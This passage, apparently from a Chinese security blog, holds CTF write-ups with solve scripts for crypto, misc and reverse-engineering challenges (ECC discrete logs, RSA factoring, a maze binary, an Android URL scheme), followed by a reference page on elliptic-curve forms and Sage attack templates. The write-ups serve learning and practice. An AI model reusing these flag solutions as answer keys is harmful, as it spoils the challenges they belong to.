&quot;0.1/e09+&quot;*(int(b[9]))payload += &quot;0.1/e10+&quot;*(int(b[10]))payload += &quot;0.1/e11+&quot;*(int(b[11]))payload += &quot;0.1/e013&quot;data = &quot;&quot;for i in range(0, len(payload), 4): data+=table[payload[i:i+4]]print(eval(b64encode(data.encode(&#x27;utf-8&#x27;))))r.sendline(data)print(r.recvall()) 出题思路来自TSG CTF 2020 - Beginner’s Misc，此题不止一种方法，欢迎分享其他做法。 ​ eccsimiscce 初探ecc。Be patient! hint: 注意看一下题目名字 123456789101112131415161718192021222324252627282930from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytesfrom random import getrandbitsfrom secret import flagdef gen(n): g = [] while len(g) &lt; 2: r = getrandbits(128) if r &lt; n: g += [r] return g[0], g[1]pt = b&#x27;\\x00&#x27; * 6 + long_to_bytes(int(flag,2))assert len(pt) % 8 == 0o = open(&#x27;output&#x27;,&#x27;w&#x27;)n = getPrime(64) * getPrime(64)o.write(str(n) + &#x27;\\n&#x27;)a, b = gen(n)p = []E = EllipticCurve(IntegerModRing(n), [a, b^2])P = E((0, b))p += [P.xy()]for k in range(len(pt) // 8): Q = bytes_to_long(pt[8 * k : 8 * k + 8]) * P p += [Q.xy()] P = Q o.write(str(p)) 简单ECDLP（椭圆曲线离散对数问题）。 将flag二进制值对应字符串在前面补充6个&#39;\\x00&#39;后，以8个字节一组通过ECC倍乘加密，得到的点 $Q$ 再作为下一组的基点 $P$ 继续倍乘，以此类推。 依次对每一组求解ECDLP问题，即给定2个素数 $p,q$ 的乘积 $n=pq$，已知生成元 $P$ 和积 $Q=m_iP$，求 $m_i$。 $n$ 是一个合数，根据Elliptic Curve Discrete Log in a Composite Ring，可以将其分解成模 $p$ 和模 $q$ 上的两条曲线，然后再在这两条曲线上分别求解DLP，最后通过CRT算法即可得到模 $n$ 下的解。 由于DLP的运行时长取决于ECC的光滑度，且由输出的点列表知有211个8字节串，总运行时间会比较长（Be patient）。 解出所有8字节串，连接发现是很长的01串，结合hint发现题目eccsi[misc]ce里含有misc，且$(211 \\cdot 8-6)\\cdot8=13456=(2^2\\cdot29)^2$ 为完全平方数，猜测为二维码，将01串转化为图片扫码得flag。 1234567891011121314151617181920212223242526272829303132#sagen=point=[]x1,y1=point[0]x2,y2=point[1]a=(((y2^2-y1^2)-(x2^3-x1^3))%n*inverse_mod(x2-x1,n))%nb=y1#factor(n)p=12117702104890171579q=16627969210850438723flag01=&#x27;&#x27;for i in range(1,len(point)): print(i-1,i) G=point[i-1] K=point[i] Ep=EllipticCurve(GF(p),[a,b^2]) Eq=EllipticCurve(GF(q),[a,b^2]) xp=discrete_log(Ep(K),Ep(G),operation=&#x27;+&#x27;) xq=discrete_log(Eq(K),Eq(G),operation=&#x27;+&#x27;) x=crt([ZZ(xp),ZZ(xq)],[ZZ(Ep(K).order()),ZZ(Eq(K).order())]) m=bin(x)[2:].rjust(64,&#x27;0&#x27;) print(m) flag01+=m print(flag01)#01串转图片略 ​ 大佬们帮我看看我这个Python脚本为什么运行不了啊 菜鸡 9:36:27菜鸡上传了文件 新建文本文档.py 菜鸡 9:37:02key1: Do you want a DaJiBei? 菜鸡 9:37:61大佬们帮我看看我这个Python脚本为什么运行不了啊 hint1: 最终结果是自带flag格式的，可以据此判断结果是否正确，不必浪费时间尝试提交格式 hint2: 为什么运行结果里好好的3，也要写成大小写混乱的样子？ hint3: 如果某个方向已经找不到更多的线索，不妨回头看看来时的道路 hint4: 本题的加密方式来源于对以下问题的思考：如何在同一个载体上加密两段信息，且读取其中一种信息的过程会令另一种信息被破坏；并且，如果前一种信息的读取方式足够显而易见，是否可以在有限的短时间内尽可能转移注意力，减少非预期接收者发现另一段信息的可能性？为了降低难度，本题在选择每一种信息的加密方式时，尽可能选择了复杂度较低的做法；同时，将其中一段信息（相信大家都已经找到这一段了）设计为另一段信息加密方式的提示。 hint5: 3对应...-- 1234567891011121314fROM CRYPTO.utIL.NuMBER IMPORT BYteS_TO_LoNG, long_TO_BYTESA_Fake_FLaG = B&#x27;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#x27;nuMBER = bYTEs_tO_long(a_FAKE_FLAG)KeY1 = B&#x27;DO yOU WAnT A DAJIBEI?&#x27;KEY1 = Bytes_to_lONG(KEY1)KEY2 = 0XBCD2deE7E7114B5C856F8DAECeD0782BD891200B4D8264D854A13D53cF1F0c481biv = 10800KEY3 = KeY2 * IVIS_THIS_rEAL_FlAG = (NUmber + kEY3) // KEy1print(long_tO_bytes(IS_THis_REAl_flag)) 新颖的题目设计，将真正信息藏于易读信息里，视觉第一影响大脑，接收先入信息以减少其他信息被注意的可能，有种首因效应的意味。 根据题面知真正的key1=&#39;Do you want a DaJiBei?&#39;，修正除&#39;FLag&#123;I_AM_the_TRUE_Flag_trUST_me&#125;&#39;外的字母大小写，运行脚本得到输出结果为thrEE_means_3，结合hint5知应该是摩斯密码，赛时连蒙带猜猜中flag，下来询问出题者@cheyenne预期解为，将代码全文大小写分别转换为.和-后解密得flag。 ​ 单表加密 替换式密码，又名取代加密法，是密码学中按规律将文字加密的一种方式。替换式密码仅对明文中字符组成的单元进行替换，但密文中单元的位置没有改变。如果每一个字符为一单元进行加密操作，就称之为“简易替换密码”或“单表加密”。一种单表加密的做法是事先约定一份文本作为密码本，并根据文本内容和特征对明文进行替换加密。由于密码本仅提供给非常重要的人士，在一定程度上增加了密码的安全性。据称，在我国古代，苏州一带的当铺曾经大量使用此类密码。注意：古代苏州当铺的伙计不认识拉丁字母、阿拉伯数字和标点符号，所以当时的密码本仅使用汉字 hint1: 做题时不要老是上外部网站。 hint2: 密码本可能会在2月10日进行一次较大的更新。 hint3: 想一想，那个把数字加密成汉字的替换密码的实质是什么？ hint4: 密码本：请点击页面最上方的VIP 苏州码子+ctfshow vip页密码本+当铺密码。 第一步，将word中苏州码子替换为数字。 第二步，到https://vip.ctf.show/，将上一步每行数字按照`模块数+行数+第几个字`方式取出对应的字。 第三步，数每个汉字有多少笔画出头，就是转化成16进制的数字几。 最后得到的16进制串转字符串即为flag。 12345678910111213141516dic=&#123;&#x27;11&#x27;:&#x27;什么是会员&#x27;,&#x27;12&#x27;:&#x27;平台自开通以来凭借着众多优秀的原创题目与活跃和谐的社区环境受到了广大的一致好评但是近几&#x27;,&#x27;21&#x27;:&#x27;会员有什么特权&#x27;,&#x27;22&#x27;:&#x27;会员目前针对平台入门系列题目开通会员后可以解锁全部道题目同时由平台技术&#x27;,&#x27;41&#x27;:&#x27;题目有哪些内容&#x27;,&#x27;42&#x27;:&#x27;入门系列题目采用循序渐进的方式逐步开放题栈如下&#x27;,&#x27;61&#x27;:&#x27;会员开通价格&#x27;,&#x27;62&#x27;:&#x27;平台题目绝大部分都是原创题目出题师傅们付出了辛勤的劳动考虑到学习的大部分还是以学生为主&#x27;,&#x27;71&#x27;:&#x27;会员价格元还是感觉贵了怎么办&#x27;,&#x27;72&#x27;:&#x27;这个确实还是个问题所以笔者建议经济实力不够的同学可以联系两三个好友合买一个号目前支付宝支持分期和花呗&#x27;,&#x27;81&#x27;:&#x27;如何支付开通会员&#x27;&#125;x=[613,613,613,225,613,2231,613,6239,6239,7235,4223,723,421,4223,613,6224,813,2222,4223,225,421,2231,813,2222,4223,4223,813,813,813,2222,4223,6239,6239,813,421,1219,813,2222,4223,6239,613,2231,4223,2222,6239,7249]word=&#x27;&#x27;for k in x: s=str(k) key=s[:2] index=int(s[2:]) print(index) word+=dic[key][index-1] print(word)#开开开针开由开以以买下确入下开勤支解下针入由支解下下支支支解下以以支入目支解下以开由下解以花#666c61677b48346e5f4c315f44555f4775305f47614f7d ​ RealSimpleAlgorithm So real, so simple… 123456789101112131415161718from Crypto.Util.number import *from secret import flagdef findPrime(k): return k if isPrime(k) else findPrime(k+1) p = getPrime(256)q = findPrime(20210123 * p * p)r = findPrime(p * q * q)s = findPrime(p * q * r)n = p * q * r * se = 0x10001m = bytes_to_long(flag)w = open(&#x27;output&#x27;,&#x27;wb&#x27;)w.write(long_to_bytes(n))w.write(b&#x27;\\n\\n&#x27;)w.write(long_to_bytes(pow(m, e, n))) RSA签到题，考察next_prime特性。 根据素数定理，素数的平均间隔为：$\\cfrac{x}{\\pi(x)} \\approx \\ln(x)$，因此常见的下一个素数比当前素数大一点，一般不会超过1500。 由于素数间隔不会超1500，故： $q\\approx 20210123 \\cdot p^2$ $r\\approx p \\cdot q^2 \\approx 20210123^2 \\cdot p^5$ $s \\approx p \\cdot q \\cdot r \\approx 20210123^3 \\cdot p^8$ $n \\approx p \\cdot q \\cdot r \\cdot s \\approx 20210123^6 \\cdot p^{16}$ 以开方取整得到的值开始爆破 $p$ ，再分别求出对应的 $q,r,s$，基本RSA操作即可得到flag。 12345678910111213141516171819202122232425262728293031import gmpy2n=c=def cal(p): q=gmpy2.next_prime(20210123*p*p) r=gmpy2.next_prime(p*q*q) s=gmpy2.next_prime(p*q*r) return p*q*r*s def findp(p,n): print(p) while 1: nx=cal(p) if nx&lt;n: p=gmpy2.next_prime(p+1) else: return p #n ~ (20210123**6)*(p**16)approx=gmpy2.iroot(n//pow(20210123,6),16)[0]p=findp(approx,n)print(p)q=gmpy2.next_prime(20210123*p*p)r=gmpy2.next_prime(p*q*q)s=gmpy2.next_prime(p*q*r)phi=(p-1)*(q-1)*(r-1)*(s-1)d=gmpy2.invert(0x10001,phi)m=pow(c,d,n)print(bytes.fromhex(hex(m)[2:])) ​ REVERSEA-Maze-In 真·签到 迷宫题。 注意函数sub_4011B0()： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596int sub_4011B0()&#123; char x; // bl@1 unsigned __int8 j; // dl@1 signed int i; // esi@2 char c; // al@3 int len; // ecx@4 unsigned int v5; // esi@19 char flag[256]; // [sp+8h] [bp-230h]@1 char input[256]; // [sp+108h] [bp-130h]@1 int data; // [sp+208h] [bp-30h]@1 int v10; // [sp+20Ch] [bp-2Ch]@1 int v11; // [sp+210h] [bp-28h]@1 int v12; // [sp+214h] [bp-24h]@1 int v13; // [sp+218h] [bp-20h]@1 int v14; // [sp+21Ch] [bp-1Ch]@1 int v15; // [sp+220h] [bp-18h]@1 int v16; // [sp+224h] [bp-14h]@1 int v17; // [sp+228h] [bp-10h]@1 int v18; // [sp+22Ch] [bp-Ch]@1 int v19; // [sp+230h] [bp-8h]@1 data = -1341248919; v10 = 1078449436; v11 = -404433706; v12 = 2107721006; v13 = 310654741; v14 = 466487083; v15 = 244438942; v16 = -1045521021; v17 = -1205263960; v18 = 136611182; v19 = 31438528; memset(flag, 0, 0x100u); memset(input, 0, 0x100u); printf_(&quot;Do you wanna play a game?\\n&quot;); printf_(&quot;Let&#x27;s play escape game where you have to find a way out. Please enter your way:&quot;); sub_401050(&quot;%s&quot;, input, 256); x = 3; j = 0; if ( strlen(input) != 34 ) goto _Failed; i = 0; do &#123; c = input[i]; switch ( c ) &#123; case &#x27;U&#x27;: len = j; if ( byte_404018[4 * (x + 8 * j)] != 1 ) goto _Failed; --j; break; case &#x27;D&#x27;: len = j; if ( byte_404019[4 * (x + 8 * j)] != 1 ) goto _Failed; ++j; break; case &#x27;L&#x27;: len = j; if ( byte_40401A[4 * (x + 8 * j)] != 1 ) goto _Failed; --x; break; default: if ( c != &#x27;R&#x27; ) goto _Failed; len = j; if ( byte_40401B[4 * (x + 8 * j)] != 1 ) goto _Failed; ++x; break; &#125; ++i; &#125; while ( i &lt; 34 ); if ( x != 4 || j != 7 ) &#123;_Failed: printf_(&quot;You&#x27;re stuck!\\n&quot;); return 0; &#125; if ( decrypt((int)flag, (int)&amp;data, len, (int)input) == -1 ) return 0; printf_(&quot;Escaped! You see the flag\\n&quot;); v5 = 0; do &#123; Sleep(0xC8u); printf_(&quot;%c&quot;, flag[v5++]); &#125; while ( v5 &lt;= 44 ); return 0;&#125; 信息： 迷宫起点(3,0)，终点(4,7)，大小8*8，只允许四个方向键-上(U)下(D)左(L)右(R)，每个格子由代表4个方向的4个字节构成，1表示对应方向通，0表示对应方向不通，最大步数为34，求路径。 在0x404018处可以导出迷宫数据： 1234567891011121314151600 01 00 01 00 01 01 01 00 00 01 01 01 00 01 0100 01 01 00 00 01 00 01 00 01 01 00 00 01 00 0001 00 00 00 01 00 00 01 00 00 01 01 00 01 01 0001 01 00 00 01 00 00 00 01 01 00 00 01 01 00 0000 01 00 01 00 00 01 01 00 00 01 01 01 00 01 0001 00 00 01 00 01 01 00 01 00 00 01 01 01 01 0001 00 00 01 00 01 01 00 00 01 00 01 00 00 01 0100 01 01 00 01 01 00 00 00 01 00 01 01 00 01 0000 01 00 01 01 00 01 00 01 00 00 01 00 01 01 0001 01 00 00 01 01 00 00 01 00 00 01 00 01 01 0001 01 00 00 00 01 00 01 00 00 01 01 01 00 01 0001 01 00 00 01 01 00 00 00 01 00 01 01 00 01 0001 01 00 00 01 00 00 01 00 01 01 00 00 01 00 0101 00 01 00 01 01 00 00 01 00 00 01 00 01 01 0001 00 00 01 00 00 01 01 01 00 01 00 01 00 00 0100 01 01 00 01 00 00 01 00 00 01 01 01 00 01 00 可在纸上复现迷宫，正常走出路径，nc提交得flag。 ​ Matara Okina https://ctfshow.lanzous.com/i4PQEkn6vch apk分析。 jadx逆向分析源码，找到FlagActivity，根据结果字符串@lgvjocWzihodmXov[EWO和算法逆出原始字符串： 1234567891011121314151617181920ans=b&#x27;@lgvjocWzihodmXov[EWO&#x27;ans=list(ans)secret=[0]*21i=0while i&lt;len(secret)//2: j=i+1 secret[i]^=j x=len(secret)-1-i secret[x]^=j i=j for i in range(10): secret[i]=ans[i]^(i+1) secret[20-i]=ans[20-i]^(i+1) secret[10]=ans[10]print(bytes(secret))#Android_scheme_is_FUN 得到的只是secret部分，需提交data， 注意到paramBundle=getIntent().getData()且paramBundle具有getScheme()和getHost()方法，了解知为Android业务组件URL Scheme，到AndroidManifest.xml中查看，发现 &lt;data android:host=&quot;p4th&quot; android:path=&quot;/70/1nput android:scheme=&quot;sh0w&quot;&gt; 构造出链接&lt;a href=&quot;sh0w://p4th/70/1nput?secret=Android_scheme_is_FUN&quot;&gt;打开APP&lt;/a&gt;，调试出flag。 ​ warmupIDA分析，输入flag长度为48，再把byte_40A0数组中的0xFF依次替换为48个值，最后16×16矩阵检测每行、每列以及每个4×4块是否满足0-15共16个值。 原始byte_40A0数组： 1234567891011121314151608 0E FF 0C 09 0D FF 01 0A 0F 03 0B 00 02 FF 0401 06 03 02 05 0A 07 00 08 09 FF 04 0F 0E 0B 0D0A 00 FF 0D 04 0F 03 0B 07 05 0E 02 06 08 0C 0104 0B 05 0F FF 02 FF 0C 06 0D 01 00 FF 0A 03 0902 0A FF 03 0D 00 0B 05 0C FF 09 01 FF 0F 07 0E0D 07 0C 0B 0F 0E 0A 08 00 FF 05 03 09 06 01 02FF 01 0F FF 0C 09 04 06 02 0E 0D FF FF 03 0A FF09 04 06 0E 02 07 01 03 0B 08 0A 0F 05 FF 00 0CFF 03 0A 07 0E 08 0C 04 09 FF 00 0D 02 FF 06 FF0C 09 01 FF 0B 03 0F 0D 0E 0A FF FF 08 00 04 0706 0D 00 08 0A 01 02 FF FF 07 04 05 0C 0B FF 0F0B 02 0E FF 00 FF 05 FF 0F 01 FF 0C 0A 09 0D 03FF 0F 0B FF 03 0C FF 0E 05 FF FF 09 FF 04 08 0A0E 08 FF FF 07 05 0D 0F 04 03 FF FF 01 0C 09 00FF 05 0D 09 06 04 08 0A 01 0C 0F 0E FF 07 02 0B03 FF 04 0A FF 0B 09 02 0D 00 FF 08 0E FF 0F 06 从前面代码逻辑推测为十六宫格填充，0xFF为需要填充的数字，填入后逐个取出即为flag。 利用excel，填充结果： 逐个取出： 12345678910111213x =[7, 6, 5, 12, 9, 8, 14, 7, 8, 6, 4, 4, 5, 0, 7, 11, 8, 13, 15, 11, 1, 5, 5, 2, 6, 9, 3, 14, 4, 6, 7, 8, 7, 1, 0, 2, 6, 13, 2, 6, 11, 10, 0, 3, 12, 1, 7, 5]flag=&#x27;&#x27;for k in x: if k+48&gt;47 and k+48&lt;=57: flag+=chr(k+48) elif k+87&gt;96 and k+87&lt;=102: flag+=chr(k+87) else: flag+=&#x27;?&#x27; print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021赛","slug":"2021赛","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"曲线","slug":"crypto-曲线","date":"2021-01-20T12:17:07.000Z","updated":"2025-03-24T12:07:17.634Z","comments":true,"path":"2021/01/20/crypto-曲线/","permalink":"https://lazzzaro.github.io/2021/01/20/crypto-%E6%9B%B2%E7%BA%BF/","excerpt":"","text":"​ 数据库： https://www.hyperelliptic.org/EFD/ https://safecurves.cr.yp.to/equation.html 判据单位元 $O$：$O+Q=Q$ =&gt; $(0,0)+(x_1,y_1)=(x_1,y_1)$ 逆元 $-Q$：$(-Q)+Q=0$ =&gt; $(x_1,y_1)+(x_2,y_2)=(0,0)$ 映射前后曲线的阶不变。 ​ 常见曲线Edwards Curves一般方程： $x^2+y^2=c^2(1+dx^2y^2)$ 变换：$\\Big(\\cfrac{X}{c}\\Big)^2+\\Big(\\cfrac{Y}{c}\\Big)^2=1+Dc^4\\Big(\\cfrac{X}{c}\\Big)^2\\Big(\\cfrac{Y}{c}\\Big)^2 \\Rightarrow X^2+Y^2=1+DX^2Y^2$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1y_2+y_1x_2}{c(1+dx_1x_2y_1y_2)},\\cfrac{y_1y_2-x_1x_2}{c(1-dx_1x_2y_1y_2)}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{2x_1y_1}{c(1+dx_1^2y_1^2)},\\cfrac{y_1^2-x_1^2}{c(1-dx_1^2y_1^2)}\\Big)$ 取反： $-(x_1,y_1)=(-x_1,y_1)$ 映射： $x^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ 其中： $u=\\cfrac{1+y}{1-y},v=\\cfrac{2(1+y)}{x(1-y)}=\\cfrac{2u}{x}$ $A=\\cfrac{4}{1-d}-2,B=\\cfrac{1}{1-d}$ 参考： https://safecurves.cr.yp.to/equation.html Crypto CTF 2021 - RoHaLd ​ Twisted Edwards Curves一般方程： $ax^2+y^2=c^2(1+dx^2y^2)$ 变换：$a\\Big(\\cfrac{X}{c}\\Big)^2+\\Big(\\cfrac{Y}{c}\\Big)^2=1+Dc^4\\Big(\\cfrac{X}{c}\\Big)^2\\Big(\\cfrac{Y}{c}\\Big)^2 \\Rightarrow AX^2+Y^2=1+DX^2Y^2$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1y_2+y_1x_2}{1+dx_1x_2y_1y_2},\\cfrac{y_1y_2-ax_1x_2}{1-dx_1x_2y_1y_2}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{2x_1y_1}{1+dx_1^2y_1^2},\\cfrac{y_1^2-ax_1^2}{1-dx_1^2y_1^2}\\Big)$ 取反： $-(x_1,y_1)=(-x_1,y_1)$ 映射： $ax^2+y^2=1+dx^2y^2 \\longmapsto Bv^2=u^3+Au^2+u$ 其中： $u=\\cfrac{1+y}{1-y},v=\\cfrac{1+y}{x(1-y)}=\\cfrac{u}{x}$ $A=\\cfrac{2(a+d)}{a-d},B=\\cfrac{4}{a-d}$ 参考： Twisted Edwards Curves NCTF 2022 - superecc ​ Binary Edwards Curves一般方程： $d_1(x+y)+d_2(x^2+y^2)=(x+x^2)(y+y^2)$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{d_1(x_1+x_2)+d_2(x_1+y_1)(x_2+y_2)+(x_1+x_1^2)[x_2(y_1+y_2+1)+y_1y_2]}{d_1+(x_1+x_1^2)(x_2+y_2)},\\cfrac{d_1(y_1+y_2)+d_2(x_1+y_1)(x_2+y_2)+(y_1+y_1^2)[y_2(x_1+x_2+1)+x_1x_2]}{d_1+(y_1+y_1^2)(x_2+y_2)}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{2d_1x_1+d_2(x_1+y_1)^2+(x_1+x_1^2)[x_1(2y_1+1)+y_1^2]}{d_1+(x_1+x_1^2)(x_1+y_1)},\\cfrac{2d_1y_1+d_2(x_1+y_1)^2+(y_1+y_1^2)[y_1(2x_1+1)+x_1^2]}{d_1+(y_1+y_1^2)(x_1+y_1)}\\Big)$ 取反： $-(x_1,y_1)=(y_1,x_1)$ 映射： $d_1(x+y)+d_2(x^2+y^2)=(x+x^2)(y+y^2) \\longmapsto v^2+uv=u^3+au^2+b$ 其中 $u=\\cfrac{d_1(d_1^2+d_1+d_2)(x+y)}{xy+d_1(x+y)},v=d_1(d_1^2+d_1+d_2)\\Big(\\cfrac{x}{xy+d_1(x+y)}+d_1+1\\Big)$ $a=d_1^2+d_2,b=d_1^4(d_1^4+d_1^2+d_2^2)$ 参考： Binary Edwards Curves ​ Hessian Curves一般方程： $x^3+y^3+1=3dxy$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{y_1^2x_2-y_2^2x_1}{x_2y_2-x_1y_1},\\cfrac{x_1^2y_2-x_2^2y_1}{x_2y_2-x_1y_1}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{y_1(1-x_1^3)}{x_1^3-y_1^3},\\cfrac{x_1(1-y_1^3)}{x_1^3-y_1^3}\\Big)$ 取反： $-(x_1,y_1)=(y_1,x_1)$ ​ Twisted Hessian Curves一般方程： $ax^3+y^3+1=dxy$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1-y_1^2x_2y_2}{ax_1y_1x_2^2-y_2},\\cfrac{y_1y_2^2-ax_1^2x_2}{ax_1y_1x_2^2-y_2}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{x_1-y_1^3x_1}{ay_1x_1^3-y_1},\\cfrac{y_1^3-ax_1^3}{ay_1x_1^3-y_1}\\Big)$ 取反： $-(x_1,y_1)=\\Big(\\cfrac{x_1}{y_1},\\cfrac{1}{y_1}\\Big)$ ​ Jacobi Quartics一般方程： $y^2=ex^4-2dx^2+1$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{x_1y_2+y_1x_2}{1-e(x_1x_2)^2},\\cfrac{(1+e(x_1x_2)^2)(y_1y_2-2dx_1x_2)+2ex_1x_2(x_1^2+x_2^2)}{(1-e(x_1x_2)^2)^2}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{2x_1y_1}{1-ex_1^4},\\cfrac{(1+ex_1^4)(y_1^2-2dx_1^2)+4ex_1^4}{(1-ex_1^4)^2}\\Big)$ 取反： $-(x_1,y_1)=(-x_1,y_1)$ 映射： $y^2=ex^4-2dx^2+1 \\longmapsto v^2=u^3+Au^2+B$ 其中： $u=2\\cfrac{3(y+1)-dx^2}{3x^2},v=4\\cfrac{(y+1)-dx^2}{x^3}$ $A=-4\\cfrac{3e+d^2}{3},B=-\\cfrac{16}{27}d(d^2-9e)$ ​ Huff Curve一般方程： $x(ay^2-1)=y(bx^2-1)$ 加法： $(x_1,y_1)+(x_2,y_2)=\\Big(\\cfrac{(x_1+x_2)(1+ay_1y_2)}{(1+bx_1x_2)(1-ay_1y_2)},\\cfrac{(y_1+y_2)(1+bx_1x_2)}{(1-bx_1x_2)(1+ay_1y_2)}\\Big)$ 倍乘： $2(x_1,y_1)=\\Big(\\cfrac{2x_1(1+ay_1^2)}{(1+bx_1^2)(1-ay_1^2)},\\cfrac{2y_1(1+bx_1^2)}{(1-bx_1^2)(1+ay_1^2)}\\Big)$ 取反： $-(x_1,y_1)=(x_1,y_1)$ 映射： $x(ay^2-1)=y(bx^2-1) \\longmapsto Bv^2=u^3+Au^2+u$ 其中： $u=\\cfrac{bx-ay}{y-x},v=\\cfrac{b-a}{y-x}$ $A=a+b,B=ab$ 参考： 2023 DASCTF CBCTF - CB curve ​ $x^2+ey^2 \\equiv 1$一般方程： $x^2+ey^2 \\equiv 1 \\pmod p$ 加法： $(x_1,y_1)+(x_2,y_2)=(x_1x_2-ey_1y_2,x_1y_2+x_2y_1)$ 映射： $p$ 为素数，如 $e$ 是模 $N$ 的二次剩余，设 $d$ 满足 $d^2\\equiv e\\pmod p$ 曲线 $E$ 上的任意一点 $G(x_0,y_0)$，都满足方程：$x_0^2+e\\cdot y_0^2\\equiv 1\\pmod p$ 代数变形一下，得到： $(x_0+i\\cdot d\\cdot y_0)\\cdot (x_0-i\\cdot d\\cdot y_0)\\equiv 1\\pmod p,i^2+1=0$ 可以看到曲线 $E$ 上的点与模 $p$ 的高斯整数 $x_0+i\\cdot d\\cdot y_0$ 是相互对应的。 不难验证如上的对应关系其实是一个同态。那么可以将曲线 $E$ 上的离散对数问题转换到有限域 $\\mathbb{F}_{p^2}$ 上去。（注意到 $p$ 为一高斯素数） 对于 $s = x_0+i\\cdot d\\cdot y_0$，注意到有： $s^{N+1}=x_0^{N+1}+\\sum_{k=1}^{N-1}x_{0}^{k}{N\\choose k}(i\\cdot d\\cdot y_0)^{N-k} + (i\\cdot d\\cdot y_0)^{N+1}\\equiv x_0^2+e\\cdot y_0^2\\equiv 1\\pmod p$ 所以 $s$ 的阶为 $p+1$，尝试将 $p+1$ 进行分解，如果其十分光滑，可尝试用Pohlig-Hellman算法来求解DLP。 ​ 代码模板类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788# Sage# y^2 = ax^2 - bx (mod p)from Crypto.Util.number import inverse, bytes_to_long, long_to_bytesfrom sage.groups.generic import bsgsfrom hashlib import md5class SpecialCurve: def __init__(self, p, a, b): self.p = p self.a = a self.b = b def __str__(self): return f&#x27;SpecialCurve(&#123;self.p&#125;,&#123;self.a&#125;,&#123;self.b&#125;)&#x27; def __call__(self, x, y): return SpecialCurvePoint(self.p, self.a, self.b, x, y) def __contains__(self, other): x, y = other.x, other.y return (self.a * x ** 2 - self.b * x - y ** 2) % self.p == 0class SpecialCurvePoint: def __init__(self, p, a, b, x, y): self.p = p self.a = a self.b = b self.x = x % p self.y = y % p def __str__(self): return &quot;(%d, %d)&quot; % (self.x, self.y) def __repr__(self): return str(self) def __add__(self, P1): x1, y1 = self.x, self.y x2, y2 = P1.x, P1.y if x1 == 0: return P1 elif x2 == 0: return self elif x1 == x2 and (y1+y2) % self.p == 0: return SpecialCurvePoint(self.p, self.a, self.b, 0, 0) if self == P1: t = (2*self.a*x1-self.b)*inverse(2*y1, self.p) % self.p else: t = (y2-y1)*inverse(x2-x1, self.p) % self.p x3 = self.b*inverse(self.a-t**2, self.p) % self.p y3 = x3*t % self.p return SpecialCurvePoint(self.p, self.a, self.b, x3, y3) def __mul__(self, k): assert k &gt;= 0 Q = SpecialCurvePoint(self.p, self.a, self.b, 0, 0) P = SpecialCurvePoint(self.p, self.a, self.b, self.x, self.y) cnt = 0 now = 1 while k &gt; 0: if k % 2: k -= 1 Q = P + Q cnt += now else: k //= 2 P = P + P now *= 2 return Q def order(self): return self.p + 1 def is_zero(self): return self.x == 0 and self.other == 0 def __eq__(self, other): return self.a == other.a and self.b == other.b and self.p == other.p and self.x == other.x and self.y == other.y def __hash__(self): return int(md5((&quot;%d-%d-%d-%d-%d&quot; % (self.p, self.a, self.b, self.x, self.y)).encode()).hexdigest(), 16)def invert(P): return SpecialCurvePoint(P.p, P.a, P.b, P.x, -P.y % P.p)def add(P1, P2): return P1 + P2 转三元齐次方程12345678910111213p = a = P = (, )Q = (, )R.&lt;x,y,z&gt; = Zmod(p)[]cubic = a*x^3 + y^3 + z^3 - d*x*y*zE = EllipticCurve_from_cubic(cubic,morphism=True)order = EllipticCurve_from_cubic(cubic,morphism=False)P = E(P)Q = E(Q)m = Q.log(P)print(long_to_bytes(m)) 1234567891011121314151617181920212223242526272829303132333435p = d = c = F = GF(p)x, y, z = QQ[&quot;x,y,z&quot;].gens()eq = 2 * x ^ 3 + y ^ 3 + c * z ^ 3 - d * x * y * zphi = EllipticCurve_from_cubic(eq)E = phi.codomain().change_ring(GF(p))P = (, )Q = (, )fx, fy, fz = map(lambda f: f.change_ring(F), phi.defining_polynomials())phiP = lambda x, y, z=1: E(fx(x, y, z) / fz(x, y, z), fy(x, y, z) / fz(x, y, z))EP = phiP(*P)EQ = phiP(*Q)n = E.order()factors = list(factor(n))m = 1moduli = []remainders = []print(f&quot;[+] Running Pohlig Hellman&quot;)print(factors)count = 0for i, j in factors: count += 1 if i &lt; 10**12: continue mod = i**j print(mod) g2 = EP*(mod) q2 = EQ*(mod) r = discrete_log(q2, g2, ord=E.order(), operation=&#x27;+&#x27;)print(long_to_bytes(r)) ​ 常用算法计算曲线方程： $(x_1,y_1)=(x_2,y_2)$ 情况下的斜率 $k=f’(x)$，逆推 $f(x)+C$，根据已知点确定 $C$ 值。 ​ 大步小步算法（BSGS算法）计算离散对数，套用sagemath中自带的bsgs。 sage自带的bsgs算法有bug，文件 /opt/sagemath-9.3/local/lib/python3.7/site-packages/sage/groups/generic.py 中468行没写全，这导致bsgs自定义群的计算报错，解决方案就是把这一行参数补全即可。 c = op(inverse(b), multiple(a, lb, operation=operation, identity=identity, inverse=inverse, op=op)) 123456789101112131415curve =G =Q =p = E = curve(0, 0)order = p + 1factors = [..]ans = []for factor in factors: this = bsgs(G * (order // factor), Q * (order // factor), (0, factor), operation=&#x27;other&#x27;, op=add, inverse=invert, identity=E) ans.append(this) print(this)k = crt(ans, factors) ​ Pohlig-Hellman算法适用情况：曲线的阶光滑。 有些时候，尽管BSGS能够将复杂度降至 